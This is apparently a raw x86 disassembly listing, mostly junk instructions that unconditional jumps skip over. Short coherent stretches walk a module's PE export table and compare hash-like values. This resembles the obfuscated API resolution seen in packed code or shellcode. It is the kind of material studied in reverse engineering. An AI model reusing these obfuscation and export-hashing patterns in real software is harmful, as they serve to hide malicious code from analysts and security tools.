  40f2cc:	jmp    0x40f7b6
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	rcl    BYTE PTR [edx],1
  40f2f8:	inc    eax
  40f2f9:	xchg   ecx,eax
  40f2fa:	daa    
  40f2fb:	jbe    0x40f2a6
  40f2fd:	jo     0x40f36f
  40f2ff:	ret    
  40f300:	jg     0x40f372
  40f302:	jo     0x40f371
  40f304:	sbb    al,0x9
  40f306:	xor    al,0xdd
  40f308:	inc    ebp
  40f309:	or     bh,BYTE PTR [esp+ebp*2+0x20]
  40f30d:	call   0x7347bba9
  40f312:	outs   dx,BYTE PTR ds:[esi]
  40f313:	mov    ch,0xce
  40f315:	fiadd  DWORD PTR [ecx]
  40f317:	addr16 test eax,0x53c132c3
  40f31d:	jecxz  0x40f32f
  40f31f:	je     0x40f2ac
  40f321:	out    dx,eax
  40f322:	xchg   ecx,eax
  40f323:	out    0xa0,eax
  40f325:	aas    
  40f326:	or     esp,DWORD PTR [esi+0x20a4de08]
  40f32c:	pop    ecx
  40f32d:	dec    esp
  40f32e:	push   ds
  40f32f:	(bad)  
  40f330:	sbb    BYTE PTR [ecx+0x1f],dh
  40f333:	xchg   BYTE PTR [ecx],ah
  40f335:	sar    BYTE PTR [eax-0x40],0xae
  40f339:	and    eax,edi
  40f33b:	out    dx,al
  40f33c:	mov    eax,ds:0x4ea317dd
  40f341:	fsubr  DWORD PTR [eax+eiz*4-0x722b13e1]
  40f348:	pusha  
  40f349:	cmp    ecx,DWORD PTR [edx+0x3]
  40f34c:	cli    
  40f34d:	or     eax,eax
  40f34f:	jl     0x40f35e
  40f351:	mov    ds:0x805813d8,al
  40f356:	mov    ecx,0x82801315
  40f35b:	into   
  40f35c:	neg    DWORD PTR [eax]
  40f35e:	iret   
  40f35f:	mov    BYTE PTR [esi+edx*8+0x36668364],dl
  40f366:	es push edx
  40f368:	pop    ebp
  40f369:	retf   0x66b2
  40f36c:	in     eax,dx
  40f36d:	out    dx,al
  40f36e:	lods   al,BYTE PTR ds:[esi]
  40f36f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f370:	adc    ecx,ebp
  40f372:	cs pop esi
  40f374:	call   0x8accb8c5
  40f379:	enter  0x73a4,0xff
  40f37d:	mov    bl,0xbb
  40f37f:	stos   DWORD PTR es:[edi],eax
  40f380:	aas    
  40f381:	sar    DWORD PTR [ebp-0xd],0x86
  40f385:	ret    0x6e0c
  40f388:	inc    esp
  40f389:	or     BYTE PTR [ebp+ebx*4-0x26],dh
  40f38d:	cdq    
  40f38e:	sbb    eax,0x5a7c3441
  40f393:	fcom   st(5)
  40f395:	cmp    edi,ebx
  40f397:	xlat   BYTE PTR ds:[ebx]
  40f398:	or     ecx,DWORD PTR [edx+0x5e]
  40f39b:	xchg   edi,eax
  40f39c:	(bad)  
  40f39d:	stos   BYTE PTR es:[edi],al
  40f39e:	xchg   ecx,eax
  40f39f:	dec    esp
  40f3a0:	clc    
  40f3a1:	jbe    0x40f3ec
  40f3a3:	mov    ebp,0xe31c5794
  40f3a8:	shr    BYTE PTR [ecx+0x5fc9843b],0xf9
  40f3af:	sbb    DWORD PTR [edx],ebp
  40f3b1:	test   BYTE PTR [esi-0x77186d70],dl
  40f3b7:	test   eax,0x43d0db78
  40f3bc:	sub    DWORD PTR [eax],edx
  40f3be:	xchg   DWORD PTR [esi-0x5c11bce4],edx
  40f3c4:	push   0xfffffff6
  40f3c6:	js     0x40f392
  40f3c8:	ins    DWORD PTR es:[edi],dx
  40f3c9:	jne    0x40f404
  40f3cb:	sbb    DWORD PTR [eax+edx*2+0x4c30db21],edi
  40f3d2:	repnz or dh,al
  40f3d5:	outs   dx,BYTE PTR ds:[esi]
  40f3d6:	or     DWORD PTR [esi+0x71e3e224],eax
  40f3dc:	ret    0x9269
  40f3df:	sub    bl,BYTE PTR [ecx]
  40f3e1:	mov    edi,DWORD PTR [edx-0x6024f571]
  40f3e7:	ins    BYTE PTR es:[edi],dx
  40f3e8:	mov    bh,BYTE PTR [ebx+0x1b0e1581]
  40f3ee:	and    dl,cl
  40f3f0:	cmc    
  40f3f1:	in     al,dx
  40f3f2:	jne    0x40f39b
  40f3f4:	xchg   edi,eax
  40f3f5:	pop    ds
  40f3f6:	add    ebx,DWORD PTR [eax-0x3f]
  40f3f9:	cmp    BYTE PTR [eax-0x61bfb31b],0x59
  40f400:	lahf   
  40f401:	push   cs
  40f402:	dec    esi
  40f403:	retf   0xef94
  40f406:	mov    eax,0xf4ed4719
  40f40b:	xlat   BYTE PTR ds:[ebx]
  40f40c:	add    al,0xa2
  40f40e:	call   0x9eb69d1d
  40f413:	xchg   DWORD PTR [edi],ebp
  40f415:	sbb    edx,DWORD PTR [esi+edi*1]
  40f418:	pop    eax
  40f419:	in     al,0x2b
  40f41b:	sub    dh,BYTE PTR [ebp+0x5f]
  40f41e:	neg    DWORD PTR [esi+esi*1]
  40f421:	xchg   ecx,eax
  40f422:	mov    eax,ds:0xabc7f3f2
  40f427:	out    dx,eax
  40f428:	mov    al,0x7d
  40f42a:	xchg   bh,dl
  40f42c:	test   BYTE PTR ds:0x4f1a7fc3,dh
  40f432:	clc    
  40f433:	icebp  
  40f434:	stos   DWORD PTR es:[edi],eax
  40f435:	sbb    DWORD PTR es:[edx],edx
  40f438:	cmp    DWORD PTR [ebp-0x75e0c33f],0xb0115740
  40f442:	cs repnz mov ah,0xaf
  40f446:	xchg   edi,eax
  40f447:	push   ebp
  40f448:	jb     0x40f41f
  40f44a:	ins    DWORD PTR es:[edi],dx
  40f44b:	add    al,0xef
  40f44d:	fstp   TBYTE PTR [ebx-0x1d]
  40f450:	mov    eax,DWORD PTR [ebp-0x8]
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	pusha  
  40f465:	(bad)  
  40f466:	jl     0x40f408
  40f468:	cmp    DWORD PTR [edi+0x7fc37070],esi
  40f46e:	jo     0x40f4e0
  40f470:	xor    esi,DWORD PTR ds:0xcbb2ab19
  40f476:	pop    ebx
  40f477:	retf   0xf33f
  40f47a:	push   esp
  40f47b:	mov    BYTE PTR [edx],dh
  40f47d:	mov    WORD PTR [ebp-0x1891880b],?
  40f483:	ins    DWORD PTR es:[edi],dx
  40f484:	adc    al,BYTE PTR [ebx+eiz*8+0x46]
  40f488:	jo     0x40f44c
  40f48a:	addr16 pop ecx
  40f48c:	sub    BYTE PTR [esp+edx*2],dh
  40f48f:	in     eax,dx
  40f490:	adc    al,0xd8
  40f492:	dec    esp
  40f493:	(bad)  
  40f495:	in     eax,0x7c
  40f497:	stos   DWORD PTR es:[edi],eax
  40f498:	mov    ch,0x7a
  40f49a:	cmp    al,0x9a
  40f49c:	dec    ebx
  40f49d:	add    BYTE PTR [edx],0xcd
  40f4a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4a1:	mov    al,ds:0x3cf5c3e3
  40f4a6:	xlat   BYTE PTR ds:[ebx]
  40f4a7:	out    dx,eax
  40f4a8:	leave  
  40f4a9:	test   BYTE PTR [eax-0x60706ee0],bh
  40f4af:	daa    
  40f4b0:	sbb    al,dl
  40f4b2:	adc    BYTE PTR [esi-0x6c],ah
  40f4b5:	aaa    
  40f4b6:	add    BYTE PTR [ecx+0x509d3fd0],al
  40f4bc:	jbe    0x40f482
  40f4be:	jo     0x40f442
  40f4c0:	pusha  
  40f4c1:	xchg   ebp,eax
  40f4c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4c3:	mov    ebp,0x4badfe4b
  40f4c8:	sub    al,0xf5
  40f4ca:	jmp    0x6ed9:0xc85d581c
  40f4d1:	sbb    DWORD PTR [ebp-0x39],ecx
  40f4d4:	xor    cl,bh
  40f4d6:	jle    0x40f501
  40f4d8:	inc    ebx
  40f4d9:	enter  0xdc11,0x9e
  40f4dd:	jnp    0x40f551
  40f4df:	or     eax,DWORD PTR [esi]
  40f4e1:	add    BYTE PTR [esi+0x2e],al
  40f4e4:	scas   eax,DWORD PTR es:[edi]
  40f4e5:	xchg   esp,eax
  40f4e6:	lods   al,BYTE PTR ds:[esi]
  40f4e7:	les    edi,FWORD PTR [ebx-0x59]
  40f4ea:	jnp    0x40f476
  40f4ec:	sbb    DWORD PTR [ebx-0x5b],edx
  40f4ef:	xor    al,0xb5
  40f4f1:	inc    edi
  40f4f2:	das    
  40f4f3:	fisubr WORD PTR [edi+eax*4+0x5a]
  40f4f7:	aam    0xe7
  40f4f9:	inc    edx
  40f4fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4fb:	imul   esi,DWORD PTR [ebx],0x64
  40f4fe:	pusha  
  40f4ff:	mov    edi,0xa0ddb15d
  40f504:	and    al,0x4
  40f506:	stc    
  40f507:	retf   
  40f508:	into   
  40f509:	mov    esp,0xe1c0fa75
  40f50e:	mov    WORD PTR [edx+0x54bad1b5],?
  40f514:	(bad)  
  40f515:	mov    edx,0xcb9a962e
  40f51a:	es mov dh,0x28
  40f51d:	shr    DWORD PTR [edi+0x68],1
  40f520:	or     eax,DWORD PTR fs:[esi-0x660a1622]
  40f527:	cdq    
  40f528:	or     DWORD PTR [eax+0x7d085907],esi
  40f52e:	sbb    eax,0x6dce0093
  40f533:	jo     0x40f576
  40f535:	js     0x40f58f
  40f537:	mov    edx,DWORD PTR [ecx]
  40f539:	into   
  40f53a:	test   DWORD PTR [ebx-0x1096a0c6],ebp
  40f540:	addr16 or eax,0x43fc3512
  40f546:	sbb    ebx,esp
  40f548:	loope  0x40f532
  40f54a:	pop    es
  40f54b:	lock loope 0x40f5ab
  40f54e:	scas   eax,DWORD PTR es:[edi]
  40f54f:	push   ebx
  40f550:	xchg   edx,eax
  40f551:	inc    esi
  40f552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f553:	pop    edx
  40f554:	dec    esp
  40f555:	mov    edi,0x787f2286
  40f55a:	test   BYTE PTR [esi+0x8],bl
  40f55d:	test   BYTE PTR [eax-0x12],bl
  40f560:	jecxz  0x40f51e
  40f562:	cs pop ecx
  40f564:	cdq    
  40f565:	mov    WORD PTR [edi-0x51ccfd99],ss
  40f56b:	pop    es
  40f56c:	jg     0x40f5ba
  40f56e:	out    dx,eax
  40f56f:	cmp    bh,BYTE PTR [edi+0x16]
  40f572:	jl     0x40f5cc
  40f574:	into   
  40f575:	sbb    al,0x4d
  40f577:	adc    esi,DWORD PTR [ebx]
  40f579:	bound  ebp,QWORD PTR [ebp-0x22]
  40f57c:	dec    edx
  40f57d:	aad    0xc0
  40f57f:	xor    BYTE PTR [ecx-0x2e],dh
  40f582:	xchg   ecx,eax
  40f583:	inc    esi
  40f584:	es out dx,eax
  40f586:	fisubr WORD PTR [esi-0x44]
  40f589:	adc    al,0x10
  40f58b:	pop    eax
  40f58c:	aas    
  40f58d:	outs   dx,DWORD PTR ds:[esi]
  40f58e:	adc    DWORD PTR [ebx],esi
  40f590:	pop    ebp
  40f591:	gs dec eax
  40f593:	mov    eax,ds:0xa608ac2a
  40f598:	push   eax
  40f599:	mov    edi,0x4aff4030
  40f59e:	iret   
  40f59f:	cmps   WORD PTR fs:[esi],WORD PTR es:[edi]
  40f5a2:	and    esp,ebp
  40f5a4:	les    edx,FWORD PTR [esi-0xead1074]
  40f5aa:	pop    esp
  40f5ab:	sbb    DWORD PTR [edx+0x8fa5944],esi
  40f5b1:	and    eax,0x19d3fb72
  40f5b6:	fucom  st(0)
  40f5b8:	lock sub al,0xc9
  40f5bb:	mov    al,0x8f
  40f5bd:	mov    eax,DWORD PTR [eax]
  40f5bf:	mov    eax,DWORD PTR [eax+0x3c]
  40f5c2:	lea    ecx,[ecx*8+0x78]
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	shr    DWORD PTR [ecx-0x497345f5],cl
  40f609:	jo     0x40f67b
  40f60b:	ret    
  40f60c:	jg     0x40f67e
  40f60e:	jo     0x40f5ed
  40f610:	mov    edi,0x8a341e19
  40f615:	shl    DWORD PTR [edi],0x8a
  40f618:	(bad)  
  40f619:	ins    DWORD PTR es:[edi],dx
  40f61a:	mov    dl,0xa4
  40f61c:	inc    eax
  40f61d:	or     al,0x4e
  40f61f:	fsubrp st(2),st
  40f621:	sub    DWORD PTR [edx-0x530b7c85],edx
  40f627:	push   edx
  40f628:	jb     0x40f63a
  40f62a:	pop    esi
  40f62b:	jg     0x40f655
  40f62d:	adc    DWORD PTR [edi+0x64],ecx
  40f630:	les    edi,FWORD PTR [ecx+0x1dde0c56]
  40f636:	test   eax,0x6c445078
  40f63b:	outs   dx,DWORD PTR ds:[esi]
  40f63c:	lock into 
  40f63e:	ficom  DWORD PTR [ebx]
  40f640:	xchg   esp,eax
  40f641:	in     al,dx
  40f642:	(bad)  
  40f643:	addr16 push edx
  40f645:	xchg   ebx,eax
  40f646:	xchg   edx,eax
  40f647:	je     0x40f66b
  40f649:	sub    al,BYTE PTR [eax-0x6e]
  40f64c:	jmp    0x379e:0xded59bc2
  40f653:	jns    0x40f649
  40f655:	adc    al,0xf5
  40f657:	push   ds
  40f658:	into   
  40f659:	jle    0x40f631
  40f65b:	sub    al,BYTE PTR [edx-0xe710aee]
  40f661:	add    eax,0xc4f15183
  40f666:	pop    eax
  40f667:	mov    eax,0x91487e9f
  40f66c:	dec    ebp
  40f66d:	rol    BYTE PTR [ebp+eiz*2-0x3e92bd54],1
  40f674:	push   ebx
  40f675:	test   DWORD PTR [ecx+0x7c7a1130],eax
  40f67b:	pop    ds
  40f67c:	lds    edi,FWORD PTR [edi+0x61053c4c]
  40f682:	mov    dl,0xf6
  40f684:	icebp  
  40f685:	in     al,dx
  40f686:	loopne 0x40f639
  40f688:	test   eax,0xb1e28af3
  40f68d:	clc    
  40f68e:	add    al,0x97
  40f690:	ret    0x37db
  40f693:	mov    edx,gs
  40f695:	fwait
  40f696:	push   esi
  40f697:	add    BYTE PTR [esi+0x1be0ab18],bl
  40f69d:	dec    edx
  40f69e:	shl    BYTE PTR [ebp+0x3f],cl
  40f6a1:	add    al,0xcd
  40f6a3:	icebp  
  40f6a4:	jbe    0x40f62a
  40f6a6:	and    BYTE PTR [ebx-0xc],al
  40f6a9:	arpl   WORD PTR [ecx*1+0x659e57a5],dx
  40f6b0:	mov    al,0xb8
  40f6b2:	pop    ebp
  40f6b3:	xor    ebp,DWORD PTR [ebx]
  40f6b5:	addr16 dec edi
  40f6b7:	fwait
  40f6b8:	loopne 0x40f730
  40f6ba:	mov    bh,0xbd
  40f6bc:	or     al,0xb
  40f6be:	mov    eax,0x6db6ed5c
  40f6c3:	mov    al,ds:0xaf00f63b
  40f6c8:	fadd   QWORD PTR [eax+0x6d1d1e92]
  40f6ce:	mov    ch,0x35
  40f6d0:	inc    ebp
  40f6d1:	inc    esp
  40f6d2:	and    eax,0x5107d821
  40f6d7:	add    al,0xc8
  40f6d9:	aad    0x1
  40f6db:	dec    esp
  40f6dc:	lods   al,BYTE PTR ds:[esi]
  40f6dd:	jne    0x40f748
  40f6df:	inc    ebx
  40f6e0:	push   edi
  40f6e1:	mov    ebp,0x59b7180a
  40f6e6:	dec    ebp
  40f6e7:	xchg   edi,eax
  40f6e8:	aam    0x91
  40f6ea:	xchg   esp,eax
  40f6eb:	mov    dl,0x7d
  40f6ed:	inc    edi
  40f6ee:	dec    edi
  40f6ef:	mov    DWORD PTR ds:0xc5d38987,esi
  40f6f5:	iret   
  40f6f6:	mov    edx,?
  40f6f8:	je     0x40f720
  40f6fa:	bound  esi,QWORD PTR [edx]
  40f6fc:	or     eax,0x880c3057
  40f701:	xchg   ebx,eax
  40f702:	in     al,dx
  40f703:	lea    eax,[edx+0x54]
  40f706:	(bad)  
  40f707:	or     esp,DWORD PTR [ecx]
  40f709:	imul   edx,DWORD PTR [edx+0x4d706229],0xffffffe3
  40f710:	sub    eax,0x1e40fe83
  40f715:	and    edx,DWORD PTR [ebp+0x62440a0d]
  40f71b:	shl    edx,1
  40f71d:	pop    esi
  40f71e:	fsub   DWORD PTR [ebx+ebx*2+0x3d]
  40f722:	pop    edi
  40f723:	imul   BYTE PTR [eax+edi*2-0x5ffe635c]
  40f72a:	fstp   QWORD PTR [ecx]
  40f72c:	sbb    edx,ecx
  40f72e:	jb     0x40f787
  40f730:	arpl   WORD PTR [eax-0x65],cx
  40f733:	repnz inc esi
  40f735:	nop
  40f736:	xchg   BYTE PTR [esi],dl
  40f738:	push   esi
  40f739:	bound  esi,QWORD PTR [ebp+0x68]
  40f73c:	sbb    al,0x5f
  40f73e:	mov    ds:0x809fc296,al
  40f743:	inc    ebx
  40f744:	push   0xffffffc9
  40f746:	adc    ah,BYTE PTR [edi]
  40f748:	mov    edi,0x3b1b8962
  40f74d:	ret    
  40f74e:	out    dx,eax
  40f74f:	mov    esp,DWORD PTR [ebx+eiz*4-0x6ddc54cc]
  40f756:	sar    BYTE PTR [ebx+0x42],1
  40f759:	pop    es
  40f75a:	jmp    0xf886835e
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0xa02e46f3
  40f7e3:	mov    ch,0xc8
  40f7e5:	pop    edi
  40f7e6:	mov    ch,0x70
  40f7e8:	jo     0x40f78d
  40f7ea:	jge    0x40f85c
  40f7ec:	jo     0x40f860
  40f7ee:	lds    edx,FWORD PTR [ebx]
  40f7f0:	(bad)  
  40f7f1:	in     eax,dx
  40f7f2:	mov    bl,0x97
  40f7f4:	cmp    DWORD PTR [eax+0xb637c96],esp
  40f7fa:	test   eax,0x745d032d
  40f7ff:	inc    esp
  40f800:	in     al,0xd
  40f802:	cmp    ebp,eax
  40f804:	mov    eax,DWORD PTR [ecx+0x3e]
  40f807:	mov    dl,0xb4
  40f809:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f80a:	stos   DWORD PTR es:[edi],eax
  40f80b:	jmp    0x3bf5:0x616a7722
  40f812:	(bad)  
  40f813:	std    
  40f814:	jg     0x40f813
  40f816:	lock jecxz 0x40f866
  40f819:	cwde   
  40f81a:	mov    edx,0x9160c8d8
  40f81f:	xchg   edi,eax
  40f820:	retf   0x4bcb
  40f823:	ins    BYTE PTR es:[edi],dx
  40f824:	pop    ecx
  40f825:	scas   al,BYTE PTR es:[edi]
  40f826:	leave  
  40f827:	jae    0x40f7e5
  40f829:	inc    esp
  40f82a:	or     eax,0xb3dc0848
  40f82f:	sahf   
  40f830:	add    dl,BYTE PTR [ecx-0x4411c0d7]
  40f836:	js     0x40f803
  40f838:	xchg   edx,eax
  40f839:	cli    
  40f83a:	lods   al,BYTE PTR ds:[esi]
  40f83b:	dec    edi
  40f83c:	into   
  40f83d:	cmp    al,0x7
  40f83f:	or     BYTE PTR [eax+0x6d],bl
  40f842:	xchg   ebp,eax
  40f843:	cmp    ecx,DWORD PTR [esi-0x43]
  40f846:	and    cl,BYTE PTR [ebx]
  40f848:	sar    dl,cl
  40f84a:	or     esi,DWORD PTR [edx+ecx*1+0x70dc99ec]
  40f851:	dec    ebp
  40f852:	adc    esp,DWORD PTR [edi]
  40f854:	sbb    DWORD PTR [ecx-0x31],eax
  40f857:	aaa    
  40f858:	add    BYTE PTR [ebx],ch
  40f85a:	and    DWORD PTR [eax+0x3d1aea9],ebp
  40f860:	or     eax,0x4e6b9e3c
  40f865:	xor    al,0xb6
  40f867:	out    0xa5,eax
  40f869:	into   
  40f86a:	xchg   DWORD PTR [edx],eax
  40f86c:	or     al,bh
  40f86e:	shl    BYTE PTR [eax+0x443990f2],cl
  40f874:	inc    esi
  40f875:	pop    edx
  40f876:	js     0x40f81d
  40f878:	mov    al,bh
  40f87a:	(bad)  
  40f87b:	in     eax,dx
  40f87c:	hlt    
  40f87d:	add    eax,0x4030aac2
  40f882:	adc    eax,0xd682e436
  40f887:	add    eax,0xac491361
  40f88c:	cmp    al,0x69
  40f88e:	or     BYTE PTR ds:0x6de3ad,cl
  40f894:	add    eax,0x22251fa5
  40f899:	mov    eax,0xbe67efa0
  40f89e:	pop    ecx
  40f89f:	inc    ebx
  40f8a0:	loop   0x40f854
  40f8a2:	imul   edx,DWORD PTR [ecx],0x67
  40f8a5:	jno    0x40f8ac
  40f8a7:	push   ss
  40f8a8:	(bad)  
  40f8aa:	(bad)  
  40f8ab:	(bad)  
  40f8ac:	lock mov esp,0x200901a0
  40f8b2:	out    dx,al
  40f8b3:	je     0x40f8f2
  40f8b5:	mov    al,ds:0x9c50fde5
  40f8ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8bb:	or     bl,BYTE PTR [edx-0x75a9c4f5]
  40f8c1:	test   BYTE PTR [edi+0x6f4e1c5e],0x31
  40f8c8:	mov    cl,0x60
  40f8ca:	pop    eax
  40f8cb:	lock test BYTE PTR [ebp+0x2aee0f27],al
  40f8d2:	fcmove st,st(3)
  40f8d4:	jne    0x40f8be
  40f8d6:	mov    dl,0xd4
  40f8d8:	jne    0x40f94a
  40f8da:	and    edi,DWORD PTR [ebx-0x4f]
  40f8dd:	scas   eax,DWORD PTR es:[edi]
  40f8de:	mov    ebx,0x7f96240e
  40f8e3:	jo     0x40f8d6
  40f8e5:	cdq    
  40f8e6:	push   0x6b
  40f8e8:	dec    ebx
  40f8e9:	xor    dl,BYTE PTR [edi+edi*8+0x8]
  40f8ed:	lods   eax,DWORD PTR ds:[esi]
  40f8ee:	shl    esp,cl
  40f8f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8f1:	dec    ebp
  40f8f2:	xchg   ebp,eax
  40f8f3:	lea    ebx,[esi]
  40f8f5:	(bad)  
  40f8f6:	nop
  40f8f7:	xchg   ebx,eax
  40f8f8:	mov    ecx,0x96375d54
  40f8fd:	or     ebp,DWORD PTR [ebx+ebx*1-0x4194fbd8]
  40f904:	popa   
  40f905:	sahf   
  40f906:	cmp    dh,BYTE PTR ds:0xc8d6b5b9
  40f90c:	push   edx
  40f90d:	jns    0x40f8c0
  40f90f:	xor    DWORD PTR ds:0xf57f107e,esi
  40f915:	jl     0x40f910
  40f917:	mov    ebx,0x3602462
  40f91c:	setnp  ah
  40f91f:	push   ecx
  40f920:	gs inc ebx
  40f922:	mul    DWORD PTR [ebp+0x18]
  40f925:	aas    
  40f926:	mov    al,0x83
  40f928:	mov    esp,0xa2899af8
  40f92d:	sub    esp,esi
  40f92f:	(bad)  
  40f930:	mov    eax,0x5955e73e
  40f935:	fxch   st(7)
  40f937:	push   0xffffff9e
  40f939:	push   ds
  40f93a:	dec    esi
  40f93b:	or     cl,bl
  40f93d:	xchg   ebp,eax
  40f93e:	shl    BYTE PTR [esi+0x9],0x4c
  40f942:	fdivr  QWORD PTR [ecx]
  40f944:	sbb    al,0x1d
  40f946:	pop    esp
  40f947:	dec    ebx
  40f948:	adc    ebx,DWORD PTR [edx+0xb]
  40f94b:	jne    0x40f932
  40f94d:	enter  0xe75,0xd8
  40f951:	jbe    0x40f908
  40f953:	xchg   edx,eax
  40f954:	push   esp
  40f955:	imul   ecx,DWORD PTR [ebx-0x30],0xacb199fd
  40f95c:	dec    eax
  40f95d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f95e:	mov    bh,0xbb
  40f960:	dec    edi
  40f961:	sbb    eax,DWORD PTR [edx+0x54]
  40f964:	cld    
  40f965:	add    BYTE PTR [ecx+0x68d66a1c],ch
  40f96b:	cwde   
  40f96c:	pop    ds
  40f96d:	sti    
  40f96e:	outs   dx,BYTE PTR ds:[esi]
  40f96f:	leave  
  40f970:	aad    0xce
  40f972:	adc    al,0x36
  40f974:	add    eax,0x555f72d8
  40f979:	or     bl,0x7a
  40f97c:	dec    edi
  40f97d:	pushw  0xfff0
  40f980:	jl     0x40f973
  40f982:	xchg   edx,eax
  40f983:	mov    al,ds:0xef905b4e
  40f988:	lock mov eax,0xd10f8a8b
  40f98e:	mov    al,ds:0xd7c84699
  40f993:	nop
  40f994:	and    DWORD PTR ds:0x688bdd4d,edi
  40f99a:	outs   dx,DWORD PTR ds:[esi]
  40f99b:	push   eax
  40f99c:	cmp    eax,0x8b0d07f0
  40f9a1:	in     eax,dx
  40f9a2:	rcl    DWORD PTR [eax],cl
  40f9a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9a5:	in     al,dx
  40f9a6:	sub    edi,edi
  40f9a8:	add    al,0x21
  40f9aa:	jns    0x40f9b5
  40f9ac:	mov    DWORD PTR [esi-0x20ca9a1b],eax
  40f9b2:	mov    ds,WORD PTR gs:[ebp+edx*4-0x43244b9a]
  40f9ba:	jae    0x40f971
  40f9bc:	jnp    0x40fa11
  40f9be:	sbb    al,0x2a
  40f9c0:	sbb    DWORD PTR [ecx+ebp*2-0x6d7246bb],0xfe4a4779
  40f9cb:	inc    ebx
  40f9cc:	add    DWORD PTR [eax+0x61],edi
  40f9cf:	jo     0x40f9d5
  40f9d1:	lods   eax,DWORD PTR ds:[esi]
  40f9d2:	pop    DWORD PTR [eax-0x42f9a7ab]
  40f9d8:	push   esi
  40f9d9:	pop    ss
  40f9da:	lods   al,BYTE PTR ds:[esi]
  40f9db:	popa   
  40f9dc:	adc    esp,ecx
  40f9de:	jge    0x40f9d2
  40f9e0:	arpl   WORD PTR [edx],cx
  40f9e2:	jg     0x40fa41
  40f9e4:	xor    eax,0x3a4047bf
  40f9e9:	gs stc 
  40f9eb:	fwait
  40f9ec:	pop    ecx
  40f9ed:	jecxz  0x40f989
  40f9ef:	lods   al,BYTE PTR ds:[esi]
  40f9f0:	stc    
  40f9f1:	js     0x40f984
  40f9f3:	(bad)  [eax]
  40f9f5:	and    eax,0x304adfba
  40f9fa:	push   esp
  40f9fb:	xchg   ecx,eax
  40f9fc:	pop    eax
  40f9fd:	in     al,dx
  40f9fe:	xchg   ebp,eax
  40f9ff:	jnp    0x40fa1d
  40fa01:	repz push 0x55
  40fa04:	pop    DWORD PTR [edi]
  40fa06:	and    esi,DWORD PTR ds:0x4f08ae5b
  40fa0c:	out    0x89,eax
  40fa0e:	push   es
  40fa0f:	dec    ebp
  40fa10:	cmp    esp,ecx
  40fa12:	sbb    al,bl
  40fa14:	(bad)  
  40fa15:	out    0x52,al
  40fa17:	cli    
  40fa18:	leave  
  40fa19:	ss inc eax
